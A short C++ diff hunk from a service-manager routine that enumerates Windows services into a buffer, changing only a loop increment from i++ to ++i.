@@ -68,7 +68,7 @@ LPBYTE CServicesManager::GetServicesList()
 
 	szBuffer[0] = TOKEN_SERVERLIST;
 	dwOffset = 1;
-	for (unsigned long i = 0; i < dwServicesCount; i++)  // Display The Services,显示所有的服务
+	for (unsigned long i = 0; i < dwServicesCount; ++i)  // Display The Services,显示所有的服务
 	{ 
 		SC_HANDLE hServices = NULL;
 		DWORD     nResumeHandle = 0; 
